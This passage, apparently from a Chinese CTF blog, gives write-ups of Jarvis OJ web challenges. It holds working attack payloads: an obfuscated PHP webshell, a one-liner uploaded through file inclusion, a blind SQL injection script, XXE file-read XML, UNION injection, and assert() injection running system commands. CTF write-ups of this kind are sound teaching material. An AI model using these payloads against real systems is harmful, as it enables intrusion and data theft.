class="string">"#"</span>^<span class="string">"p"</span>). (<span class="string">"&gt;"</span>^<span class="string">"j"</span>). (<span class="string">"!"</span>^<span class="string">"z"</span>). (<span class="string">"T"</span>^<span class="string">"g"</span>). (<span class="string">"e"</span>^<span class="string">"S"</span>). (<span class="string">"_"</span>^<span class="string">"o"</span>). (<span class="string">"?"</span>^<span class="string">"b"</span>). (<span class="string">"]"</span>^<span class="string">"t"</span>));<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>运行以后出现报错信息:</p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">Warning</span>: <span class="keyword">assert</span>() [<span class="keyword">function</span>.<span class="keyword">assert</span>]: Assertion <span class="string">"eval($_POST[360])"</span> failed <span class="keyword">in</span> C:\phpstudy\WWW\b.php <span class="keyword">on</span> <span class="literal">line</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>所以密码就是360，最后构造URL：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/proxy.php?url=http:/</span><span class="regexp">/103.27.76.153/</span>proxy.php?url=http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32782</span><span class="regexp">/admin/</span>trojan.php</span><br></pre></td></tr></table></figure></p>
+<p>POST的数据为：<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">360</span>=<span class="string">"ls"</span></span><br></pre></td></tr></table></figure></p>
+<p>获取flag：CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs}</p>
+<h3 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h3><p>题目上一开始就提到，“如果一个漏洞解决不了，那就…”，所以这里我估计至少得有两个漏洞用来利用。<br>然后，熟悉的文件上传，但是直接新建txt文件加入一句话木马后改后缀为.jpg仍然被提示请上传jpg或者gif，我查了一下，这里用的是MIME检测而不是后缀名检测。<br>参考资料：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/xiaojianpitt/</span>article<span class="regexp">/details/</span><span class="number">6856536</span></span><br></pre></td></tr></table></figure></p>
+<p>所以重新找了一张图在最后写入一句话木马然后成功上传,上传成功以后生成了一个图片ID，通过访问下面链接就能访问到上传的图片。<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32785/show</span>.php?id=<span class="number">1518677292</span>&amp;<span class="keyword">type</span>=jpg</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/02/15/5a85394be2c3e.jpg" alt=""><br>到这里以后要留意一个东西上传图片是index.php?page=submit，访问查看图片却是index.php?page=view,测试一下是否是文件包含。<br><img src="https://i.loli.net/2018/02/15/5a85395057c9c.jpg" alt=""><br>测试成功，这里确实是文件包含，所以构造：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32785</span><span class="regexp">/index.php?page=uploads/</span><span class="number">1518679392</span>.jpg</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/02/15/5a853954bc174.jpg" alt=""></p>
+<p>发现后面拼接了一个.php，用%00截断：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32785</span><span class="regexp">/index.php?page=uploads/</span><span class="number">1518679392</span>.jpg%<span class="number">00</span></span><br></pre></td></tr></table></figure></p>
+<p>但是这里却出问题了，页面上提示说：You should not do this!这里应该是一句话木马里的相关参数被过滤掉了，所以要重新修改一句话木马。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"phP"</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'w'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>重新上传，重复上述步骤，最后就能获得flag。<br><img src="https://i.loli.net/2018/02/15/5a853954bc16d.jpg" alt=""><br>flag:CTF{upl0ad_sh0uld_n07_b3_a110wed}</p>
+<p>拿到flag以后我又做了一个测试，我上传了一张干净的图片，也是用上面的访问方法再%00截断，但是什么都没有，所以这题就是文件上传+文件包含的题目了，如果上传的文件里的一句话木马被成功解析并且被访问到，就能获取flag。</p>
+<h3 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h3><p>好吧，其实我挺怕这类题的，有时候看到估计就直接懵了……诶，逃得过初一逃不过十五，该来的还要来…那就做吧。<br>测试以后，发现username和password是分开判断的，用户名admin，密码123456提示密码错误，但是用户名willard，密码123456却提示用户名错误，因此判断是根据用户名在数据库中查询密码是否存在。<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin'<span class="comment">#&amp;password=123456</span></span><br></pre></td></tr></table></figure></p>
+<p>提示密码错误，说明没有过滤’#</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>=admin' <span class="keyword">or</span> <span class="attribute">1</span>=1#&amp;password=123456</span><br></pre></td></tr></table></figure>
+<p>提示用户名错误，应该是过滤了空格，空格用/**/代替。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin'<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span>#&amp;password=<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+<p>OK,提示密码密码，这里也没有过滤or。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=user'<span class="comment">/**/</span>or<span class="comment">/**/</span>exists(<span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">admin</span>)#&amp;<span class="keyword">password</span>=<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+<p>返回密码错误，说明存在admin表；</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=user'<span class="comment">/**/</span>or<span class="comment">/**/</span>exists(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">count</span>(*)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">admin</span>)#&amp;<span class="keyword">password</span>=<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+<p>返回密码错误，说明admin表里面只有一条记录，so perfect，所以接下来要判断记录长度了。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=user'<span class="comment">/**/</span>or<span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">length</span>(<span class="keyword">password</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">admin</span>)&gt;<span class="number">31</span>#&amp;<span class="keyword">password</span>=<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+<p>返回密码错误，最后确定密码就是32位，果断md5加密后的密码！诶，再做一遍还是能学习到不少东西的…比如学会了神奇的脚本sql大法！<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	url=<span class="string">"http://web.jarvisoj.com:32787/login.php"</span></span><br><span class="line">	data=&#123;</span><br><span class="line">		<span class="string">'username'</span>:<span class="string">'xx'</span>,</span><br><span class="line">		<span class="string">'password'</span>:<span class="string">'123456'</span></span><br><span class="line">	&#125;</span><br><span class="line">	payload=<span class="string">"'/**/or/**/ascii(substr((select/**/password/**/from/**/admin),&#123;0&#125;,1))&gt;&#123;1&#125;#"</span></span><br><span class="line">	chars=<span class="string">"0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">			char_ascii=ord(j)</span><br><span class="line">			sql_payload=payload.format(i,char_ascii)</span><br><span class="line">			data[<span class="string">'username'</span>]=sql_payload</span><br><span class="line">			<span class="comment">#因为注入点在username上</span></span><br><span class="line">			rep=requests.post(url=url,data=data)</span><br><span class="line">			length=len(rep.text)</span><br><span class="line">			<span class="keyword">if</span> length&gt;<span class="number">1191</span>:</span><br><span class="line">				result+=j</span><br><span class="line">				<span class="keyword">print</span> result</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">print</span> result</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"Done"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/02/15/5a855ed6e73f6.jpg" alt=""><br>md5解码后为：eTAloCrEP<br>成功登录:flag:CTF{s1mpl3_1nJ3ction_very_easy!!} </p>
+<h3 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h3><p>看到那个熟悉的框框以后我的第一反应就是XXE（之前在SWPUCTF中做过类似的），推荐一篇关于XXE漏洞的分析：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>thief.one<span class="regexp">/2017/</span><span class="number">06</span><span class="regexp">/20/</span><span class="number">1</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
+<p>直接构造xml语句POST,再把Content-Type修改为application/xml：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE data[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY file SYSTEM "file:////home/ctf/flag.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/02/16/5a85c50f65847.jpg" alt=""><br>flag:CTF{XxE_15_n0T_S7range_Enough}</p>
+<h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><p>挺简单的一道题，打开以后是index.php，抓包以后没有发现特殊的地方，也不是源码泄露，然后就想到了robots.txt，打开以后有提示：<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Disallow:</span> /admin_s3cr3t.php</span><br></pre></td></tr></table></figure></p>
+<p>修改链接，抓包以后COOKIE参数里的参数admin=0，修改admin=1就能拿到flag。<br>flag:flag{hello_admin~}</p>
+<h3 id="inject"><a href="#inject" class="headerlink" title="inject"></a>inject</h3><p>题目HINT已经说了找源码，测试以后在index.php~下找到源码。<br><img src="https://i.loli.net/2018/02/16/5a86810f648d8.jpg" alt=""><br>源码下面有一个不知道是什么的Filter过滤（撑脸…），所以只能自己测试，desc是降序排列，desc后面跟着`，在sql里面，两个连续的``可以被看作空格，注入语句如下：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32794/index</span>.php?table=flag<span class="string">` `</span>where <span class="number">1</span>=<span class="number">2</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1</span></span><br></pre></td></tr></table></figure></p>
+<p>成功注入：<br><img src="https://i.loli.net/2018/02/16/5a86810f695ab.jpg" alt=""><br>修改select 1为select 1,2测试以后只有1列，下面查表：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32794/index</span>.php?table=flag<span class="string">` `</span>where <span class="number">1</span>=<span class="number">2</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">TABLE_NAME</span> <span class="title">from</span> <span class="title">information_schema</span>.<span class="title">tables</span></span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/02/16/5a86810f76d85.jpg" alt=""><br>获取表名，下面查列：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32794/index</span>.php?table=flag<span class="string">` `</span>where <span class="number">1</span>=<span class="number">2</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">COLUMN_NAME</span> <span class="title">from</span> <span class="title">information_schema</span>.<span class="title">columns</span></span></span><br></pre></td></tr></table></figure></p>
+<p>拿flag：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/web.jarvisoj.com:32794/index</span>.php?table=flag<span class="string">` `</span>where <span class="number">1</span>=<span class="number">2</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span>  <span class="title">flagUwillNeverKnow</span> <span class="title">from</span> <span class="title">secret_flag</span></span></span><br></pre></td></tr></table></figure></p>
+<p>flag:flag{luckyGame~} </p>
+<h3 id="babayphp"><a href="#babayphp" class="headerlink" title="babayphp"></a>babayphp</h3><p><img src="https://i.loli.net/2018/02/16/5a868e916d1ca.jpg" alt=""><br>看到Git猜测有Git源码泄露，进行测试：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32798</span><span class="regexp">/.git/</span>config</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/02/16/5a868e91a3a25.jpg" alt=""><br>果然如此，上GitHacker！源码有两部分组成，一个index.php，还有template下面的几个php文件，除了index.php，其他的没用。<br>index.php<br><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?php</span></span></span></span><br><span class="line"><span class="xml">if (isset($_GET['page'])) &#123;</span></span><br><span class="line"><span class="xml">	$page = $_GET['page'];</span></span><br><span class="line"><span class="xml">&#125; else &#123;</span></span><br><span class="line"><span class="xml">	$page = "home";</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"><span class="xml">$file = "templates/" . $page . ".php";</span></span><br><span class="line"><span class="xml">assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");</span></span><br><span class="line"><span class="xml">assert("file_exists('$file')") or die("That file doesn't exist!");</span></span><br><span class="line"><span class="xml">?&gt;</span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>My PHP Website<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-inverse navbar-fixed-top"</span>&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		    	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		    		<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"navbar-toggle collapsed"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">"#navbar"</span> <span class="attr">aria-expanded</span>=<span class="string">"false"</span> <span class="attr">aria-controls</span>=<span class="string">"navbar"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">		          	<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">		          	<span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Project name<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">		        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">		        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"navbar"</span> <span class="attr">class</span>=<span class="string">"collapse navbar-collapse"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		          	<span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">li</span> &lt;?<span class="attr">php</span> <span class="attr">if</span> ($<span class="attr">page</span> == <span class="string">"home"</span>) &#123; ?&gt;</span>class="active"<span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span>&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=home"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">li</span> &lt;?<span class="attr">php</span> <span class="attr">if</span> ($<span class="attr">page</span> == <span class="string">"about"</span>) &#123; ?&gt;</span>class="active"<span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span>&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=about"</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">		            	<span class="tag">&lt;<span class="name">li</span> &lt;?<span class="attr">php</span> <span class="attr">if</span> ($<span class="attr">page</span> == <span class="string">"contact"</span>) &#123; ?&gt;</span>class="active"<span class="php"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span>&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?page=contact"</span>&gt;</span>Contact<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">						<span class="comment">&lt;!--&lt;li &lt;?php if ($page == "flag") &#123; ?&gt;class="active"&lt;?php &#125; ?&gt;&gt;&lt;a href="?page=flag"&gt;My secrets&lt;/a&gt;&lt;/li&gt; --&gt;</span></span></span><br><span class="line"><span class="xml">		          	<span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">		        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">		    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"margin-top: 50px"</span>&gt;</span></span></span><br><span class="line"><span class="xml">			<span class="php"><span class="meta">&lt;?php</span></span></span></span><br><span class="line"><span class="xml">				require_once $file;</span></span><br><span class="line"><span class="xml">			?&gt;</span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-latest.js"</span> /&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js"</span> /&gt;</span><span class="undefined"></span></span></span><br><span class="line"><span class="xml">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>这次的代码审计很简单，看到assert的时候（苍蝇式兴奋搓脚）这果断代码执行！<br>但是它有一个文件检测机制，所以构造的时候先构造一个存在于templates的文件，比如之前通过GitHacker拿下来的flag.php,再加上代码执行语句。<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//web.jarvisoj.com:32798/?page=flag'.system("ls").'</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/02/16/5a868e91bd7df.jpg" alt=""><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32798</span><span class="regexp">/?page=flag'.system("ls templates/</span>;<span class="string">").'</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/02/16/5a868e91dc52e.jpg" alt=""><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web.jarvisoj.com:<span class="number">32798</span><span class="regexp">/?page=flag'.system("cat templates/</span>flag.php;<span class="string">").'</span></span><br></pre></td></tr></table></figure></p>
+<p>这里差一点就被骗了，因为执行以后页面显示的还是That file doesn’t exist!但是机智的我还是右键源码了一下…所以flag到手。<br><img src="https://i.loli.net/2018/02/16/5a868e91efb5e.jpg" alt=""><br>flag:61dctf{8e_careful_when_us1ng_ass4rt}</p>
+<p>暂时就先写到这里，后续做了会把做好的题目加上去~</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF-Web/" rel="tag"># CTF_Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/10/Ubuntu搭建漏洞环境/" rel="next" title="Ubuntu搭建漏洞环境">
+                <i class="fa fa-chevron-left"></i> Ubuntu搭建漏洞环境
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/02/16/XXE漏洞学习分析/" rel="prev" title="XXE漏洞学习分析">
+                XXE漏洞学习分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2018/02/19/5a8ad395132b9.jpg"
+                alt="Willard" />
+            
+              <p class="site-author-name" itemprop="name">Willard</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
